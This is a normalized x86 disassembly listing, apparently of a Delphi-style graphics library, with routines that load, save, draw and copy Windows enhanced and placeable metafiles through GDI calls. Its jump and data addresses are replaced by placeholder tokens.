mov cl 0x3f
call sub_402a70
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_424d00
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_424d7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_424b8c
mov eax [ ebp - 0x8 ]
push eax
push sub_424ca4
push ebp
call sub_424d00
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_424df8
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_420c7c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_424e38
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_423f68
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_424e80
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_425e58
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41847c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_424eb0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_425e58
mov edx esi
mov eax ebx
call sub_4184a8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_425e54
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_424f44
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_4229f0
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_4229f0
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_4229f0
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_4229f0
push eax
call SelectPalette
sub_424fdc
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_425184
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_4063e4
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_4063e4
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_425040
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_420c7c
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_4250cc
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_425184
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_4063e4
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_4063e4
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_425130
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4256ac
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41a3c0
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_4252e8
mov edx esi
mov eax ebx
call sub_425218
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_425184
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_425e58
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_425e54
pop esi
pop ebx
retn
sub_4251ac
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_4256ac
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_4252e8
mov edx esi
mov eax ebx
call sub_425218
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_425218
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_425184
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_41a5ec
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_4026dc
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_4252d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4028d8
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_41a5ec
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_422ce0
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4252df
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4026fc
retn
call sub_422ce0
sub_4252e8
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_425184
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_422ce0
lea eax [ ebp - 0x22 ]
call sub_423b30
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call sub_4063e4
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call sub_4063e4
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_425457
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_422ce0
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42545e
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4026fc
retn
call sub_422ce0
sub_425468
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42550f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_4254ed
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_408958
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c6dc
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40434c
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424234
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4254f4
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_425548
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_425184
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call sub_4063e4
mov edx eax
mov eax ebx
call sub_4255bc
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call sub_4063e4
mov edx eax
mov eax ebx
call sub_4255bc
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_4255bc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_425184
pop esi
pop ebx
retn
mov eax ebx
call sub_42570c
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4255f8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_425184
pop esi
pop ebx
retn
mov eax ebx
call sub_42570c
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_425638
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_425184
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call sub_4063e4
mov edx eax
mov eax ebx
call sub_4255f8
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call sub_4063e4
mov edx eax
mov eax ebx
call sub_4255f8
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_4256ac
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41a3c0
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_42570c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_425184
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_425e58
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_425e54
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_425790
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_41a3c0
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_42589c
mov edx ebx
mov eax esi
call sub_425810
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_425810
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42588c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41a624
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026fc
retn
sub_42589c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402b80
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_41a624
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41a624
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4259be
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026fc
retn
call sub_422d40
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_4063e4
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_4063e4
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_423b30
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4259d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4259b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_4259e4
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_425184
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_422cb0
sub_425a68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_425b38
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418258
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_425bd6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425bdd
mov eax [ rw-data ]
call sub_4182bc
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_425bae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_425cc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4228c4
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417e94
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_422868
test al al
je r-xdata
sub_425be4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418258
mov esi eax
xor ecx ecx
push ebp
push sub_425c54
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4182bc
retn
mov edx ebx
mov eax esi
call sub_417e94
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_425cc8
sub_425c60
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_422348
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_425c9c
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax esi
call sub_425cc8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42240c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_425cc8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_422644
xor edx edx
push ebp
push sub_425d5c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_422a70
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41826c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4228c4
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_425d68
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_422644
xor eax eax
push ebp
push sub_425e47
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427084
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_425be4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427184
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
